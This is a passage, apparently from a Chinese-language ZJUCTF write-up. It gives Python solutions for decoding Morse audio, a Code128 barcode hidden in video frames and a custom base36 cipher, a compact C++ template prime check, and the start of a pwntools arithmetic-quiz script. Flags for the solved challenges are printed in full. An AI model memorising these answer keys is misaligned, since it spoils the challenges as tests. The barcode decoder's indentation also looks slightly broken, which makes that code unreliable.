<span class="n">samples</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">frombuffer</span><span class="p">(</span><span class="n">samples</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span> <span class="o">-</span> <span class="mi">15</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">samples</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">samples</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">average</span><span class="p">(</span><span class="n">samples</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">15</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">15</span><span class="p">])</span>

<span class="c1"># print(&quot;Start compressing...&quot;)</span>
<span class="n">compressed</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">samples</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
<span class="n">compressed</span> <span class="o">=</span> <span class="p">[(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">compressed</span> <span class="k">if</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">]</span>
<span class="n">compressed</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">decompress</span><span class="p">(</span><span class="n">compressed</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>

<span class="c1"># Decode morse code</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">morseutils.translator</span><span class="w"> </span><span class="kn">import</span> <span class="n">MorseCodeTranslator</span> <span class="k">as</span> <span class="n">mct</span>

<span class="n">L</span> <span class="o">=</span> <span class="n">compressed</span>
<span class="n">morse</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">L</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10000</span><span class="p">:</span>
        <span class="n">morse</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">:</span>
            <span class="n">morse</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">morse</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>

<span class="n">morse_code</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">morse</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="nb">print</span><span class="p">(</span><span class="n">morse_code</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">mct</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">morse_code</span><span class="p">))</span>
</code></pre></div>
<p>修改自打 CCBC 时队友写的脚本。得到 <code>AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB</code>。</p>
<p>然后是视频，通过盯帧可以发现有些帧会有白色或者黑色的竖线，看着像条形码，写个脚本提取一下有竖线的帧，可以看到这些竖线从左到右扫描了三次（脚本代码找不到了，就不放了）。</p>
<p>写个脚本组合一下竖线，可以看到条形码，但是扫不出来。</p>
<p>文件名提示 <code>代号128</code>，说明是 <a href="https://en.wikipedia.org/wiki/Code_128">code128</a> 条形码，直接手动解码：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">cv2</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>

<span class="k">def</span><span class="w"> </span><span class="nf">compress</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">v</span><span class="p">):</span>
    <span class="n">values</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">L</span><span class="p">]</span>
    <span class="k">return</span> <span class="p">[(</span><span class="n">k</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">g</span><span class="p">)))</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">values</span><span class="p">)),</span> <span class="n">values</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">)]</span>

<span class="k">def</span><span class="w"> </span><span class="nf">slice</span><span class="p">(</span><span class="n">img</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    只提取一行，避免 AAA logo 影响</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">img</span><span class="p">[</span><span class="mi">75</span><span class="p">:</span><span class="mi">75</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># 打开视频文件</span>
<span class="n">cap</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">VideoCapture</span><span class="p">(</span><span class="s1">&#39;代号128.mp4&#39;</span><span class="p">)</span>

<span class="n">L</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="c1"># 记录</span>
<span class="n">con</span> <span class="o">=</span> <span class="p">[]</span> <span class="c1"># 组合</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">ret</span><span class="p">,</span> <span class="n">frame</span> <span class="o">=</span> <span class="n">cap</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">ret</span><span class="p">:</span>
        <span class="k">break</span>

    <span class="n">gray_frame</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_BGR2GRAY</span><span class="p">)</span>
    <span class="n">slice0</span> <span class="o">=</span> <span class="n">gray_frame</span><span class="p">[</span><span class="mi">75</span><span class="p">,</span> <span class="p">:]</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">slice0</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">50</span> <span class="ow">or</span> <span class="n">slice0</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">200</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">con</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">concatenate</span><span class="p">((</span><span class="n">con</span><span class="p">,</span> <span class="n">L</span><span class="p">[</span><span class="mi">29</span><span class="p">:</span><span class="mi">227</span><span class="p">]))</span>
                <span class="n">L</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
            <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">slice0</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="n">con</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">concatenate</span><span class="p">((</span><span class="n">con</span><span class="p">,</span> <span class="n">L</span><span class="p">[</span><span class="mi">29</span><span class="p">:</span><span class="mi">227</span><span class="p">]))</span>
<span class="n">con</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">con</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span>

<span class="n">cap</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>

<span class="c1"># code128 table</span>
<span class="n">code128_t</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;212222&quot;</span><span class="p">:</span> <span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;222122&quot;</span><span class="p">:</span> <span class="s2">&quot;!&quot;</span><span class="p">,</span> <span class="s2">&quot;222221&quot;</span><span class="p">:</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s2">&quot;121223&quot;</span><span class="p">:</span> <span class="s2">&quot;#&quot;</span><span class="p">,</span> <span class="s2">&quot;121322&quot;</span><span class="p">:</span> <span class="s2">&quot;$&quot;</span><span class="p">,</span> <span class="s2">&quot;131222&quot;</span><span class="p">:</span> <span class="s2">&quot;%&quot;</span><span class="p">,</span> <span class="s2">&quot;122213&quot;</span><span class="p">:</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">,</span> <span class="s2">&quot;122312&quot;</span><span class="p">:</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;132212&quot;</span><span class="p">:</span> <span class="s2">&quot;(&quot;</span><span class="p">,</span> <span class="s2">&quot;221213&quot;</span><span class="p">:</span> <span class="s2">&quot;)&quot;</span><span class="p">,</span> <span class="s2">&quot;221312&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">,</span> <span class="s2">&quot;231212&quot;</span><span class="p">:</span> <span class="s2">&quot;+&quot;</span><span class="p">,</span> <span class="s2">&quot;112232&quot;</span><span class="p">:</span> <span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="s2">&quot;122132&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s2">&quot;122231&quot;</span><span class="p">:</span> <span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="s2">&quot;113222&quot;</span><span class="p">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;123122&quot;</span><span class="p">:</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;123221&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;223211&quot;</span><span class="p">:</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span> <span class="s2">&quot;221132&quot;</span><span class="p">:</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span> <span class="s2">&quot;221231&quot;</span><span class="p">:</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="s2">&quot;213212&quot;</span><span class="p">:</span> <span class="s2">&quot;5&quot;</span><span class="p">,</span> <span class="s2">&quot;223112&quot;</span><span class="p">:</span> <span class="s2">&quot;6&quot;</span><span class="p">,</span> <span class="s2">&quot;312131&quot;</span><span class="p">:</span> <span class="s2">&quot;7&quot;</span><span class="p">,</span> <span class="s2">&quot;311222&quot;</span><span class="p">:</span> <span class="s2">&quot;8&quot;</span><span class="p">,</span> <span class="s2">&quot;321122&quot;</span><span class="p">:</span> <span class="s2">&quot;9&quot;</span><span class="p">,</span> <span class="s2">&quot;321221&quot;</span><span class="p">:</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;312212&quot;</span><span class="p">:</span> <span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="s2">&quot;322112&quot;</span><span class="p">:</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;322211&quot;</span><span class="p">:</span> <span class="s2">&quot;=&quot;</span><span class="p">,</span> <span class="s2">&quot;212123&quot;</span><span class="p">:</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;212321&quot;</span><span class="p">:</span> <span class="s2">&quot;?&quot;</span><span class="p">,</span> <span class="s2">&quot;232121&quot;</span><span class="p">:</span> <span class="s2">&quot;@&quot;</span><span class="p">,</span> <span class="s2">&quot;111323&quot;</span><span class="p">:</span> <span class="s2">&quot;A&quot;</span><span class="p">,</span> <span class="s2">&quot;131123&quot;</span><span class="p">:</span> <span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="s2">&quot;131321&quot;</span><span class="p">:</span> <span class="s2">&quot;C&quot;</span><span class="p">,</span> <span class="s2">&quot;112313&quot;</span><span class="p">:</span> <span class="s2">&quot;D&quot;</span><span class="p">,</span> <span class="s2">&quot;132113&quot;</span><span class="p">:</span> <span class="s2">&quot;E&quot;</span><span class="p">,</span> <span class="s2">&quot;132311&quot;</span><span class="p">:</span> <span class="s2">&quot;F&quot;</span><span class="p">,</span> <span class="s2">&quot;211313&quot;</span><span class="p">:</span> <span class="s2">&quot;G&quot;</span><span class="p">,</span> <span class="s2">&quot;231113&quot;</span><span class="p">:</span> <span class="s2">&quot;H&quot;</span><span class="p">,</span> <span class="s2">&quot;231311&quot;</span><span class="p">:</span> <span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;112133&quot;</span><span class="p">:</span> <span class="s2">&quot;J&quot;</span><span class="p">,</span> <span class="s2">&quot;112331&quot;</span><span class="p">:</span> <span class="s2">&quot;K&quot;</span><span class="p">,</span> <span class="s2">&quot;132131&quot;</span><span class="p">:</span> <span class="s2">&quot;L&quot;</span><span class="p">,</span> <span class="s2">&quot;113123&quot;</span><span class="p">:</span> <span class="s2">&quot;M&quot;</span><span class="p">,</span> <span class="s2">&quot;113321&quot;</span><span class="p">:</span> <span class="s2">&quot;N&quot;</span><span class="p">,</span> <span class="s2">&quot;133121&quot;</span><span class="p">:</span> <span class="s2">&quot;O&quot;</span><span class="p">,</span> <span class="s2">&quot;313121&quot;</span><span class="p">:</span> <span class="s2">&quot;P&quot;</span><span class="p">,</span> <span class="s2">&quot;211331&quot;</span><span class="p">:</span> <span class="s2">&quot;Q&quot;</span><span class="p">,</span> <span class="s2">&quot;231131&quot;</span><span class="p">:</span> <span class="s2">&quot;R&quot;</span><span class="p">,</span> <span class="s2">&quot;213113&quot;</span><span class="p">:</span> <span class="s2">&quot;S&quot;</span><span class="p">,</span> <span class="s2">&quot;213311&quot;</span><span class="p">:</span> <span class="s2">&quot;T&quot;</span><span class="p">,</span> <span class="s2">&quot;213131&quot;</span><span class="p">:</span> <span class="s2">&quot;U&quot;</span><span class="p">,</span> <span class="s2">&quot;311123&quot;</span><span class="p">:</span> <span class="s2">&quot;V&quot;</span><span class="p">,</span> <span class="s2">&quot;311321&quot;</span><span class="p">:</span> <span class="s2">&quot;W&quot;</span><span class="p">,</span> <span class="s2">&quot;331121&quot;</span><span class="p">:</span> <span class="s2">&quot;X&quot;</span><span class="p">,</span> <span class="s2">&quot;312113&quot;</span><span class="p">:</span> <span class="s2">&quot;Y&quot;</span><span class="p">,</span> <span class="s2">&quot;312311&quot;</span><span class="p">:</span> <span class="s2">&quot;Z&quot;</span><span class="p">,</span> <span class="s2">&quot;332111&quot;</span><span class="p">:</span> <span class="s2">&quot;[&quot;</span><span class="p">,</span> <span class="s2">&quot;314111&quot;</span><span class="p">:</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;221411&quot;</span><span class="p">:</span> <span class="s2">&quot;]&quot;</span><span class="p">,</span> <span class="s2">&quot;431111&quot;</span><span class="p">:</span> <span class="s2">&quot;^&quot;</span><span class="p">,</span> <span class="s2">&quot;111224&quot;</span><span class="p">:</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;111422&quot;</span><span class="p">:</span> <span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="s2">&quot;121124&quot;</span><span class="p">:</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;121421&quot;</span><span class="p">:</span> <span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="s2">&quot;141122&quot;</span><span class="p">:</span> <span class="s2">&quot;c&quot;</span><span class="p">,</span> <span class="s2">&quot;141221&quot;</span><span class="p">:</span> <span class="s2">&quot;d&quot;</span><span class="p">,</span> <span class="s2">&quot;112214&quot;</span><span class="p">:</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;112412&quot;</span><span class="p">:</span> <span class="s2">&quot;f&quot;</span><span class="p">,</span> <span class="s2">&quot;122114&quot;</span><span class="p">:</span> <span class="s2">&quot;g&quot;</span><span class="p">,</span> <span class="s2">&quot;122411&quot;</span><span class="p">:</span> <span class="s2">&quot;h&quot;</span><span class="p">,</span> <span class="s2">&quot;142112&quot;</span><span class="p">:</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;142211&quot;</span><span class="p">:</span> <span class="s2">&quot;j&quot;</span><span class="p">,</span> <span class="s2">&quot;241211&quot;</span><span class="p">:</span> <span class="s2">&quot;k&quot;</span><span class="p">,</span> <span class="s2">&quot;221114&quot;</span><span class="p">:</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;413111&quot;</span><span class="p">:</span> <span class="s2">&quot;m&quot;</span><span class="p">,</span> <span class="s2">&quot;241112&quot;</span><span class="p">:</span> <span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;134111&quot;</span><span class="p">:</span> <span class="s2">&quot;o&quot;</span><span class="p">,</span> <span class="s2">&quot;111242&quot;</span><span class="p">:</span> <span class="s2">&quot;p&quot;</span><span class="p">,</span> <span class="s2">&quot;121142&quot;</span><span class="p">:</span> <span class="s2">&quot;q&quot;</span><span class="p">,</span> <span class="s2">&quot;121241&quot;</span><span class="p">:</span> <span class="s2">&quot;r&quot;</span><span class="p">,</span> <span class="s2">&quot;114212&quot;</span><span class="p">:</span> <span class="s2">&quot;s&quot;</span><span class="p">,</span> <span class="s2">&quot;124112&quot;</span><span class="p">:</span> <span class="s2">&quot;t&quot;</span><span class="p">,</span> <span class="s2">&quot;124211&quot;</span><span class="p">:</span> <span class="s2">&quot;u&quot;</span><span class="p">,</span> <span class="s2">&quot;411212&quot;</span><span class="p">:</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;421112&quot;</span><span class="p">:</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="s2">&quot;421211&quot;</span><span class="p">:</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;212141&quot;</span><span class="p">:</span> <span class="s2">&quot;y&quot;</span><span class="p">,</span> <span class="s2">&quot;214121&quot;</span><span class="p">:</span> <span class="s2">&quot;z&quot;</span><span class="p">,</span> <span class="s2">&quot;412121&quot;</span><span class="p">:</span> <span class="s2">&quot;{&quot;</span><span class="p">,</span> <span class="s2">&quot;111143&quot;</span><span class="p">:</span> <span class="s2">&quot;|&quot;</span><span class="p">,</span> <span class="s2">&quot;111341&quot;</span><span class="p">:</span> <span class="s2">&quot;}&quot;</span><span class="p">,</span> <span class="s2">&quot;131141&quot;</span><span class="p">:</span> <span class="s2">&quot;~&quot;</span><span class="p">}</span>

<span class="n">res</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">con</span><span class="p">),</span> <span class="mi">6</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">con</span><span class="p">[</span><span class="n">i</span> <span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span>
    <span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">code</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">code128_t</span><span class="p">[</span><span class="n">code</span><span class="p">])</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">code128_t</span><span class="p">[</span><span class="n">code</span><span class="p">]</span>

<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div>
<p>得到 <code>BASE36ENCODETABLE:ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789</code>。</p>
<p>意思是用自定义的 base36 编码表解码上面那串密文，写个脚本解码：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base36</span>

<span class="n">custom_alphabet</span> <span class="o">=</span> <span class="s2">&quot;ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789&quot;</span>
<span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decode_custom_base36</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">):</span>
    <span class="c1"># 创建字符到值的映射字典</span>
    <span class="n">char_to_value</span> <span class="o">=</span> <span class="p">{</span><span class="n">char</span><span class="p">:</span> <span class="n">index</span> <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)}</span>

    <span class="c1"># 初始化解码后的数值</span>
    <span class="n">decoded_value</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="c1"># 遍历编码字符串</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
        <span class="n">decoded_value</span> <span class="o">=</span> <span class="n">decoded_value</span> <span class="o">*</span> <span class="mi">36</span> <span class="o">+</span> <span class="n">char_to_value</span><span class="p">[</span><span class="n">char</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">decoded_value</span>

<span class="k">def</span><span class="w"> </span><span class="nf">base36_to_string</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">while</span> <span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">value</span> <span class="o">%</span> <span class="mi">256</span><span class="p">))</span>
        <span class="n">value</span> <span class="o">//=</span> <span class="mi">256</span>
    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="c1"># 使用自定义字符集进行解码</span>
<span class="n">decoded_value</span> <span class="o">=</span> <span class="n">decode_custom_base36</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">custom_alphabet</span><span class="p">)</span>
<span class="n">decoded_string</span> <span class="o">=</span> <span class="n">base36_to_string</span><span class="p">(</span><span class="n">decoded_value</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">decoded_string</span><span class="p">)</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD}</code></p>
<h3 id="master-of-c">Master of C++<a class="headerlink" href="#master-of-c" title="Permanent link">&para;</a></h3>
<p>丢给 GPT，然后让它不断压缩代码，最后自己缩短一下函数变量名，得到：</p>
<div class="highlight"><pre><span></span><code><span class="k">template</span><span class="o">&lt;</span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">I</span><span class="o">&gt;</span><span class="k">struct</span><span class="w"> </span><span class="nc">pc</span><span class="p">{</span><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">v</span><span class="o">=</span><span class="p">(</span><span class="n">N</span><span class="o">%</span><span class="n">I</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="n">pc</span><span class="o">&lt;</span><span class="n">N</span><span class="p">,</span><span class="n">I</span><span class="mi">-1</span><span class="o">&gt;::</span><span class="n">v</span><span class="p">);};</span>
<span class="k">template</span><span class="o">&lt;</span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="o">&gt;</span><span class="k">struct</span><span class="w"> </span><span class="nc">pc</span><span class="o">&lt;</span><span class="n">N</span><span class="p">,</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">{</span><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">v</span><span class="o">=</span><span class="nb">true</span><span class="p">;};</span>
<span class="k">template</span><span class="o">&lt;</span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="o">&gt;</span><span class="k">struct</span><span class="w"> </span><span class="nc">p</span><span class="p">{</span><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">v</span><span class="o">=</span><span class="n">pc</span><span class="o">&lt;</span><span class="n">N</span><span class="p">,</span><span class="n">N</span><span class="o">/</span><span class="mi">2</span><span class="o">&gt;::</span><span class="n">v</span><span class="p">;};</span>
<span class="k">template</span><span class="o">&lt;&gt;</span><span class="k">struct</span><span class="w"> </span><span class="nc">p</span><span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">{</span><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">v</span><span class="o">=</span><span class="mi">0</span><span class="p">;};</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="k">return</span><span class="w"> </span><span class="n">p</span><span class="o">&lt;</span><span class="n">ARG</span><span class="o">&gt;::</span><span class="n">v</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">;}</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l}</code>。</p>
<h3 id="a">小 A 口算<a class="headerlink" href="#a" title="Permanent link">&para;</a></h3>
<p>没什么好写的，pwntools 使用教程罢了。代码：</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">61234</span><span class="p">)</span>

<span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200</span><span class="p">):</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; ? &#39;</span><span class="p">))</span>
    <span class="c1"># print(a, b)</span>
